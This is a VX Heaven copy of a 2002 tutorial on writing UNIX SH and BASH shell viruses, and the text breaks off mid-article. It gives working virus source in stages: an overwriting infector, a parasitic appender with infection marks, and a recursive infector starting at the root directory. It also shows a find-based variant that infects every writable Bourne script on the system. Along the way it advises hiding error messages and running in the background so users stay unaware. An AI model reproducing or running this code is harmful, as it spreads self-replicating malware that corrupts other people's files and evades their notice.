<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title> Gobleen Warrior 'UNIX SH and BASH shell viruses' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="Gobleen Warrior"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, Gobleen Warrior,UNIX SH and BASH shell viruses, variable, file, virus, string, symbol, shell, unix, procedure, check, article, infector, number, length, directory, random"/>
<meta name="Description" content="What is UNIX Shell? People, who knows it, can scip some lines below, people, who knows UNIX well, can don't read this text at all. UNIX Shell is pecular BAT language of the UNIX systems, but much more advanced, functional and effective. A lot of system utilites are written in it, and it's says a lot about UNIX Shell. There is a many varieties of the UNIX Shell, for example SH, BASH, ZSH, KSH, CSH, you even can write your own UNIX Shell interpreter. It complicates writing of the programs by reducing of their compatibility. UNIX Shell language is rather flexible and universal. Equally as in the BAT, in UNIX Shell language there are internal, built-in commands, such as, for example, &quot;cd&quot;, and external, system, commands, such as &quot;cp&quot;, for example. In the UNIX Shell language there are constuctions like &quot;if ... then&quot;, &quot;for ... in ... do&quot;, and similar to them. In this article i will talk about one from numerous versions of UNIX Shell - SH and its extended version BASH."/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"5b46cde36c746f20eedb7da51f51ec3a60b64ece-1498757363-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vgw00.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>UNIX SH and BASH shell viruses</h1><p><a href="/lib/?lang=en&amp;author=Gobleen%20Warrior"> Gobleen Warrior</a><br/> <em><a href="/vx.php?fid=11#f11">29a [6]</a></em><br/> <em>March 2002</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vgw00.html';</script><div class="ci"><a href="/lib/?ci=vgw00">1</a></div>[<a style="" href="/lib/?lang=EN&amp;index=UN#vgw00">Back to index</a>] [<a href="/lib/vgw00.html#disqus_thread">Comments</a>]<br/> 
<p>First of all i would like to ask pardons for all grammar errors, english isn't my native language, and i am too dumb to learn it well.</p>
<p>What is UNIX Shell? People, who knows it, can scip some lines below, people, who knows UNIX well, can don't read this text at all. UNIX Shell is pecular BAT language of the UNIX systems, but much more advanced, functional and effective. A lot of system utilites are written in it, and it's says a lot about UNIX Shell. There is a many varieties of the UNIX Shell, for example SH, BASH, ZSH, KSH, CSH, you even can write your own UNIX Shell interpreter. It complicates writing of the programs by reducing of their compatibility. UNIX Shell language is rather flexible and universal. Equally as in the BAT, in UNIX Shell language there are internal, built-in commands, such as, for example, "cd", and external, system, commands, such as "cp", for example. In the UNIX Shell language there are constuctions like "if ... then", "for ... in ... do", and similar to them. In this article i will talk about one from numerous versions of UNIX Shell - SH and its extended version BASH.</p>
<p>The syntax of SH is a little similar to C/C++, and this isn't wonder - well known that UNIX is at most the C system, what is extremly depresses sometimes.</p>
<p>It is possible to longly argue about rationality of the writing of Shell viruses. On the one hand they are exotic enough, as BAT, on the another hand Shell in UNIX is used mush more activer, than BAT in DOS/Windows, from the third party - UNIX is a system well good protected from viruses generally and from the script viruses especially. As you can see there are a lot of the points of view. Nevertheless, the viruses of the such type are exists, so it is needed to somebody. By the way sensational Linux.Ramen worm is a half written on the UNIX Shell script. And the final words - only the shell scripts are portable on all variants of *NIX without recompilation.</p>
<p>Probably there are enough of words, it is time already for the code to be. The mentioned below code is a primitive overwriting virus in the current catalog, and it is strikes all files, irrespective of their type.</p>
<p>NOTE: I want to ask pardon for using my nick in all example viruses in this article, but here is a reason for it. The infection mark is necessary to be very rare word, and i think my nick is such kind, because no one idiot, except me, will have this stupid word in his files. That's why it isn't a stupid self-adoration, but the simple necessity (at least i hope for it).</p>
<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #000000; font-weight: bold;">for</span> vic <span style="color: #000000; font-weight: bold;">in</span> <span style="color: #000000; font-weight: bold;">*</span><br/>
<span style="color: #000000; font-weight: bold;">do</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #c20cb9; font-weight: bold;">cp</span> <span style="color: #007800;">$0</span> <span style="color: #007800;">$vic</span><br/>
<span style="color: #000000; font-weight: bold;">done</span><br/>
&nbsp;</div>
<p>There is nothing original in this virus, and the similar viruses in this or other kind were present in all texts about this theme.</p>
<p>How and what this virus do? For each file (designated by the variable "vic") it executes the command "cp", which copies first file to second, in our case $0 to $vic. What is the $0? This built-in variable designates first element of the command line, and in our case it is the name of executed file, which stores our virus. The sign "$" means, that contents of the variable, which name stands after this sign, are used. It is necessary to notice that in UNIX the files consider all: starting from the directories, passing through the links, and finishing the operation memory, thats why we can add yet another minus to this virus - it doesn't know what it infects. Certanly, we can bypass all this, but what the sense is to put engine from "Porche" on a children's bicycle? Normal virus MUST be non-overwriting. So lets do it.</p>
<p>Here is a simple example of a parasitic virus - it is adding to the end of all files in the current directory, still without any extra functions and checks.</p>
<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #000000; font-weight: bold;">for</span> vic <span style="color: #000000; font-weight: bold;">in</span> <span style="color: #000000; font-weight: bold;">*</span><br/>
<span style="color: #000000; font-weight: bold;">do</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">if</span> <span style="color: black;">&#91;</span> <span style="color: #660033;">-z</span> <span style="color: #ff0000;">&quot;<span style="color: #780078;">`grep -s Gobleen $vic`</span>&quot;</span> <span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">then</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #7a0874; font-weight: bold;">echo</span> <span style="color: #000000; font-weight: bold;">&gt;&gt;</span> <span style="color: #007800;">$vic</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #c20cb9; font-weight: bold;">tail</span> <span style="color: #660033;">-n</span> <span style="color: #000000;">8</span> <span style="color: #007800;">$0</span> <span style="color: #000000; font-weight: bold;">&gt;&gt;</span> <span style="color: #007800;">$vic</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">fi</span><br/>
<span style="color: #000000; font-weight: bold;">done</span><br/>
&nbsp;</div>
<p>Of course, this virus is far from perfection, but, at least it isn't overwriting. How is it working? For each founded file it executes the following operations: if there are not present the string "Gobleen" (infection mark), than it appends to the end of file the symbol of line feed (some files can haven't it, and if it is - there are will be an error while executing such file after infection). After this, virus appends to the end of file 8 strings from the end of current executed file, what is the body of virus. This is all. What is used for this purposes: as you can see, the condition for operator "if" is the string [ -z "`grep -s Gobleen $vic`" ]. What does it means? All is simple - 'grep -s Gobleen $vic' prints all lines in the file $vic, which containing substring "Gobleen". "-s" is here for shut down all error messages, for example, if we will try to check the file, for which we haven't access permissions. As you see, all this string is in quotation markses (""), this means that we will take the result, which will be returned from operator "grep" as a condition for check. "-z" means "if there not the string". So all this line together will mean the condition "if there not present the strings with substring "Gobleen" in the file "$vic", than execute the next commands". And the next lines are the virus commands as themselfs.</p>
<p>String "echo >> &amp;vic" adds an ouput from the command "echo" to the and of file. By default, it adds to the output string the line feed symbol, but, in our case, we don't output a string at all, so command "echo" prints only the line feed symbol.</p>
<p>String "tail -n 8 $0 >> $vic" appends (">>") 8 strings ("-n") from the end of the file $0 to the end of the file $vic.</p>
<p>As you see, there are no any checks, but this isn't good. What kind of checks should we do? As minimum the next some: file for infection is a file (not a directory, for example); file for infection is executable; file for infection is a UNIX Shell script (of variety, that the virus for); we have a permissions for writing to this file (if we haven't it there are will be error messages on the screen); and plus for all this the thing we are already check - the previous infection. How we can do it all? Easily!</p>
<p>For checking almost all we was talking about above, we can use one very nice command - "test". Honourly speaking, we already have use it when we was checking the presence/absence of the string in the file - but there was another form of this command - "[ ... ]". Which form you will use is your decision. So, what checks can do this very nice command? I will not decribe all of them - there are tonns of them, but the main - here they are:</p>
<ul>
<li>"-e" - the file is present</li>
<li>"-d" - the file is present, and it is directory</li>
<li>"-f" - the file is present, and it is a normal file</li>
<li>"-L" - the file is present, and it is a symbolic link</li>
<li>"-r" - the file is present and we have a permissions to read it</li>
<li>"-s" - the file is present and it's size isn't zero</li>
<li>"-w" - the file is present and we have a permissions to write into it</li>
<li>"-x" - the file is present and we have a permissions to execute it</li>
</ul>
<p>And it is only for work with files! And besides there are conditions for work with lines and, purely, for work with conditions as themselfs. That's why i name this function "very nice"</p>
<p>If we need to check an absence of some condition, for example, that file isn't a directory, we must put the symbol "!" befor the condition, for example, like that:</p>
<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black;">&#91;</span> <span style="color: #000000; font-weight: bold;">!</span> <span style="color: #660033;">-d</span> <span style="color: #c20cb9; font-weight: bold;">file</span> <span style="color: black;">&#93;</span></div>
<p>or like that:</p>
<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #7a0874; font-weight: bold;">test</span> <span style="color: #000000; font-weight: bold;">!</span> <span style="color: #660033;">-d</span> <span style="color: #c20cb9; font-weight: bold;">file</span></div>
<p>The string, which checking the presence the file "file" and it's executable attributes will be looks like that:</p>
<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black;">&#91;</span> <span style="color: #660033;">-x</span> <span style="color: #c20cb9; font-weight: bold;">file</span> <span style="color: black;">&#93;</span></div>
<p>or like that:</p>
<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #7a0874; font-weight: bold;">test</span> <span style="color: #660033;">-x</span> <span style="color: #c20cb9; font-weight: bold;">file</span></div>
<p>How we can to know what type of Shell scripts our file belongs for, and is it a script at all? Unfortunally, there are no 100% clear method. There are a several ways, but each one of them haves it's own minuses:</p>
<ul>
<li>We can check the presence of tne string, pointing to the interpreter, for example #!/bin/sh in the file, but such string can be absend, and the file will be good working without it. Such files are rare, but they are can be.</li>
<li>We can call the command "file", which should print the string, describing the type of pointed file, but sometimes this command is wrong. As for example, if there are not present the string, pointing to the interpreter in the file, the command "file" can say that this file is ASCII Text, but it ain't so.</li>
<li>We can check the file for presence of some string, which is specific for such type of scripts, that we need, for example "echo" or "cat", but here we have the risk of erroneous check, what is not desirable for us.</li>
</ul>
<p>I think, that the better is to infect less, than needed, than more than it is - the first and second method is better. Which method will use you - is your decision.</p>
<p>The way of checking with help of the presence of the string is clear, the example of such actions was some lines above, but the way of checking with help of the command "file" must be commented. As it was writed above, this command returns the string, which describes the type of the pointed file. What we will do with this string? We can just compare it with the the string, which is stored in our body:</p>
<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #000000; font-weight: bold;">if</span> <span style="color: black;">&#91;</span> <span style="color: #ff0000;">&quot;<span style="color: #780078;">`file -b $vic`</span>&quot;</span> = <span style="color: #ff0000;">&quot;Bourne shell script text&quot;</span> <span style="color: black;">&#93;</span> ; <span style="color: #000000; font-weight: bold;">then</span></div>
<p>The command line parameter "-b" is needed to remove the name of tested file from the output of the command "file", we need only the type.</p>
<p>Also we can to give the output from the command "file" to the input of the command "grep" to check the presence of the keywords, for example the word "Bourne", and this way seems to me the better then previous, because of the word "Bourne" is presented in the type's name of the both script types - SH and BASH, and if we have the virus of the SH type, it is good for us, because we will can to check both types of victims. It's not meaningfull for the BASH script viruses, because of SH isn't support BASH, but is meaningfull for the the SH script viruse, because of BASH supports the SH. The code will be looked like this:</p>
<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #000000; font-weight: bold;">if</span> <span style="color: black;">&#91;</span> <span style="color: #660033;">-n</span> <span style="color: #ff0000;">&quot;<span style="color: #780078;">`file $vic | grep Bourne`</span>&quot;</span> <span style="color: black;">&#93;</span> ; <span style="color: #000000; font-weight: bold;">then</span></div>
<p>Command line parameter "-n" means, that the condition is true, when the string is presented (not empty), "|" means conveyor - the output from the command "file" is given to the input of the command "grep". As the result we will have the true, if there are the word "Bourne" in the ouput from the command "file".</p>
<p>After the adding of all this checks into our virus and a little optimisation, we will have such code:</p>
<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #000000; font-weight: bold;">for</span> vic <span style="color: #000000; font-weight: bold;">in</span> <span style="color: #000000; font-weight: bold;">*</span><br/>
<span style="color: #000000; font-weight: bold;">do</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">if</span> <span style="color: black;">&#91;</span> <span style="color: #000000; font-weight: bold;">!</span> <span style="color: #660033;">-d</span> <span style="color: #007800;">$vic</span> <span style="color: black;">&#93;</span> <span style="color: #000000; font-weight: bold;">&amp;&amp;</span> <span style="color: black;">&#91;</span> <span style="color: #660033;">-z</span> <span style="color: #ff0000;">&quot;<span style="color: #780078;">`grep -s Gobleen $vic`</span>&quot;</span> <span style="color: #660033;">-a</span> <span style="color: #660033;">-x</span> <span style="color: #007800;">$vic</span> <span style="color: #660033;">-a</span> <span style="color: #660033;">-w</span> <span style="color: #007800;">$vic</span> <span style="color: black;">&#93;</span> ; <span style="color: #000000; font-weight: bold;">then</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">if</span> <span style="color: black;">&#91;</span> <span style="color: #660033;">-n</span> <span style="color: #ff0000;">&quot;<span style="color: #780078;">`file $vic | grep Bourne`</span>&quot;</span> <span style="color: black;">&#93;</span> ; <span style="color: #000000; font-weight: bold;">then</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #7a0874; font-weight: bold;">echo</span> <span style="color: #000000; font-weight: bold;">&gt;&gt;</span> <span style="color: #007800;">$vic</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #c20cb9; font-weight: bold;">tail</span> <span style="color: #660033;">-n</span> <span style="color: #000000;">8</span> <span style="color: #007800;">$0</span> <span style="color: #000000; font-weight: bold;">&gt;&gt;</span> <span style="color: #007800;">$vic</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">fi</span>; <span style="color: #000000; font-weight: bold;">fi</span><br/>
<span style="color: #000000; font-weight: bold;">done</span><br/>
&nbsp;</div>
<p>Now we have not so bad virii, but, true spelling, not without the minuses. Here "-a" means logical "AND", which is used to the conditions. It means that the main condition will be true, if all subconditions are true. Why we check is it directory? Because of attribute "x", used to directory in UNIX means that we can change the current directory to that one with the command CD (or something like it), and if we will try to write to the directory like in the file - there will be an error, and the error message will be printed on the screen, that are dangerous to the virus - user can think why here is an error and find our virus.</p>
<p>Of course, this virus can be more optimised, but it will hamper understanding.</p>
<p>Now about the minuses - here are several of them:</p>
<ol>
<li>We are appending to the end of virus. But what will be, if the victim is finished with the command "exit"? Of course, there are very few such files, normally this command is used for exiting from the middle of the script, but it isn't more good - in the both cases our code can not be executed, and if in the second case we are still having any chances, but in the first we haven't them. And it is, you see, unpleasant.</li>
<li>Besides it, our virus is working in the current dirrectory, and it deprives it almost of all chances to live. What we have to do? There are the several ways:
<ul>
<li>infect the files in the pre-declared directoryes, such us /bin, /usr/bin and etc.</li>
<li>old good DOT-DOT - go up thru the directoryes' tree, while not going to the highest level.</li>
<li>directory traversal loop.</li>
</ul></li>
</ol>
<p>The first to ways, it seems to me, aren't effective enough, because they haves any limits, and this isn't good, especcially, if to take into account the fact, that Shell-scripts are very limited without that. Thats why we will consider at once the third way, as, by understanding it, you will can understand and write the first two ways by yourself.</p>
<p>So, directory traversal loop. It can be realised, as a minimum, by the two methods: with the help of recursive calls of the procedure with the system functions of directory changing, and with the help of the system function "find". For certain, there are also other methods, but i think that this two is enough for the begining. If you will have the strong desire to do it by the different methods - thats good, UNIX Shell is rather flexible and functional to allow you to do it without the special transactions.</p>
<p>First method: recursive search with the help of the internal procedure:</p>
<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">do_dir <span style="color: black;">&#40;</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #7a0874; font-weight: bold;">cd</span> <span style="color: #007800;">$1</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">for</span> vic <span style="color: #000000; font-weight: bold;">in</span> <span style="color: #000000; font-weight: bold;">*</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">do</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">if</span> <span style="color: black;">&#91;</span> <span style="color: #660033;">-d</span> <span style="color: #007800;">$vic</span> <span style="color: black;">&#93;</span> ; <span style="color: #000000; font-weight: bold;">then</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; do_dir <span style="color: #007800;">$vic</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">else</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">if</span> <span style="color: black;">&#91;</span> <span style="color: #660033;">-z</span> <span style="color: #ff0000;">&quot;<span style="color: #780078;">`grep -s Gobleen $vic`</span>&quot;</span> <span style="color: #660033;">-a</span> <span style="color: #660033;">-x</span> <span style="color: #007800;">$vic</span> <span style="color: #660033;">-a</span> <span style="color: #660033;">-w</span> <span style="color: #007800;">$vic</span> <span style="color: black;">&#93;</span> ; <span style="color: #000000; font-weight: bold;">then</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">if</span> <span style="color: black;">&#91;</span> <span style="color: #660033;">-n</span> <span style="color: #ff0000;">&quot;<span style="color: #780078;">`file $vic | grep Bourne`</span>&quot;</span> <span style="color: black;">&#93;</span> ; <span style="color: #000000; font-weight: bold;">then</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #7a0874; font-weight: bold;">echo</span> <span style="color: #000000; font-weight: bold;">&gt;&gt;</span> <span style="color: #007800;">$vic</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #c20cb9; font-weight: bold;">cat</span> <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>vic<span style="color: #007800;">$$</span> <span style="color: #000000; font-weight: bold;">&gt;&gt;</span> <span style="color: #007800;">$vic</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">fi</span>; <span style="color: #000000; font-weight: bold;">fi</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">fi</span>; <span style="color: #000000; font-weight: bold;">done</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #7a0874; font-weight: bold;">cd</span> ..<br/>
<span style="color: black;">&#125;</span><br/>
<span style="color: #c20cb9; font-weight: bold;">tail</span> <span style="color: #660033;">-n</span> <span style="color: #000000;">17</span> <span style="color: #007800;">$0</span> <span style="color: #000000; font-weight: bold;">&gt;</span> <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>vic<span style="color: #007800;">$$</span><br/>
do_dir <span style="color: #000000; font-weight: bold;">/</span><br/>
<span style="color: #c20cb9; font-weight: bold;">rm</span> <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>vic<span style="color: #007800;">$$</span><br/>
&nbsp;</div>
<p>How is it works? Very simple. All code between the first line and the line "cd .. }" is a procedure, which is responsible for the processing of the directory, which name is given to this procedure as a parameter. When this code starts, the execution will be processing from the command "tail", what will create the file with the clear virus body and unique name in the directory /tmp. After that the procedure do_dir () will be called with the parameter "/", what means the root of the directoryes' tree. After this function will complete, the file with the clear virus body will be erased. What the do_dir () procedure do? At the first step it changes the current directory to the directory, which name was given to this procedure as a parameter. Need to comment, that this name is short, without the full path, thats why directory changing will be in the current directory. After this, for all files/directoryes in this directory will be executed the next commands: if it is a directory - do_dir () will be recursively called with the name of founded directory as a parameter; if it is a file - it is infecting. After processing all files/directoryes in the current directory, it will be changing to the upper (".."). Processing of all directoryes' tree thus happens.</p>
<p>NOTE: Pay attention, this procedure should be placed higher. than all those lines, from which it is called, otherwise, the system will not understand, what do you want from it, because of for that moment this procedure will be unknown to the system.</p>
<p>Second method: the using of the system function "find". I think, this method must be much more commented.</p>
<p>"Find" utility is intended, first of all, for files finding, but apart from it, this utility haves many nice functions (this is peculiar to almost all UNIX utilites). One from this utility's skill is a search for files with specified attributes, another is executing some actions for each from the founded files. For example, the next command finds all executable files (executable attribute is setted at least to one from three variants - "owner", "group", "other") in the current directory and shows their names to the screen:</p>
<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #c20cb9; font-weight: bold;">find</span> . <span style="color: #660033;">-type</span> f <span style="color: #660033;">-perm</span> +<span style="color: #000000;">111</span> <span style="color: #660033;">-exec</span> <span style="color: #c20cb9; font-weight: bold;">bash</span> <span style="color: #660033;">-c</span> \<br/>
<span style="color: #ff0000;">&quot;echo WE FOUND FILE {} HERE!&quot;</span> \;<br/>
&nbsp;</div>
<p>Why is it working? Because of for each one founed file we execute the BASH enterpreter with the parameter "-c", what means "take the commands from the next coming string", and the next comming is the string with the command "echo", which shows text to the screen. The symbol "{}" means the name of the file, processing at this time by the command "find". This commands must be writed in the specified form like "commands" \; because of only in this form the interpreter understand them as a one string and transmit this string to the interpreters copy, which is executed by us. Besides that, we must to shield (put the symbol "") before the language elements, which can hinder the interpratation of this string (like "'", "$" and etc.). It will be shown much more visually, and, i hope, clearly in the next example below.</p>
<p>Now about the "find". I will not put here all it's parameters, because all of them is useful, but there are so much of them, and the putting of them here means the putting of the full text of the MAN-file, but it is not in the frameworks of this tutorial. Thats why i will describe only those parameters, which i will use:</p>
<ul>
<li>"-type" - type of the file: d - directory f - normal file l - symbolic link</li>
<li>"-perm -..." - Permission attributes of the file. All bits of the "..." must be setted for the file.</li>
<li>"-perm +..." - Permission attributes of the file. Any of the bits of the "..." must be setted for the file.</li>
<li>"-perm -..." - Permission attributes of the file. All bits of the "..." must be presented in the permisions of the file.</li>
<li>"-exec file" - Execute the file "file".</li>
</ul>
<p>Now here the code:</p>
<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #c20cb9; font-weight: bold;">tail</span> <span style="color: #660033;">-n</span> <span style="color: #000000;">8</span> <span style="color: #007800;">$0</span> <span style="color: #000000; font-weight: bold;">&gt;</span> <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>vicGWI<br/>
<span style="color: #c20cb9; font-weight: bold;">find</span> <span style="color: #000000; font-weight: bold;">/</span> <span style="color: #660033;">-type</span> f <span style="color: #660033;">-perm</span> +<span style="color: #000000;">111</span> <span style="color: #660033;">-exec</span> <span style="color: #c20cb9; font-weight: bold;">bash</span> <span style="color: #660033;">-c</span> \<br/>
<span style="color: #ff0000;">&quot;if [ ! -d {} ] &amp;&amp; [ -z <span style="color: #000099; font-weight: bold;">\&quot;</span>\<span style="color: #780078;">`grep -s Gobleen {}\`</span><span style="color: #000099; font-weight: bold;">\&quot;</span> -a -x {} -a -w {} ] ; then<br/>
&nbsp;if [ -n <span style="color: #000099; font-weight: bold;">\&quot;</span>\<span style="color: #780078;">`file {} | grep Bourne\`</span><span style="color: #000099; font-weight: bold;">\&quot;</span> ] ; then<br/>
&nbsp; echo &gt;&gt; {}<br/>
&nbsp; cat /tmp/vicGWI &gt;&gt; {}<br/>
fi; fi&quot;</span> \;<br/>
<span style="color: #c20cb9; font-weight: bold;">rm</span> <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>vicGWI<br/>
&nbsp;</div>
<p>This virus is functionally similar to the previous. It was necessary to change the name of the temporary file, because of the variable "$$" means the number of current system task, but in this virus, in the difference from the previous, the number of the task is changing for each file, because we start the new task - the copy of BASH interpreter.</p>
<p>Ok, it's good, now we can to do much things, but here is a bad thing - we are working to slow. What we should to do? Very easily! If we put the symbol "&amp;" in the end of the command line, the command will be running as the background process, what means - not noticeably, and it is what we need. But there is one problem - if we simply put this symbol in our virus - the virus will be crashing. Why? Because of after execution of the command "find" at the background, the system will not wait it's completion, and will execute the next command - "rm". Our clear virus body will be erased, and the virus will not found it for infection. So it will be crashed. We can do not erase this file at all, but, i think, it isn't good. So we need to think a little and do a litle wily trick. All would be much easier, if we were wrote our virus in a beginning of the file, but if we have selected the hard way, we should go on it up to an extremity:</p>
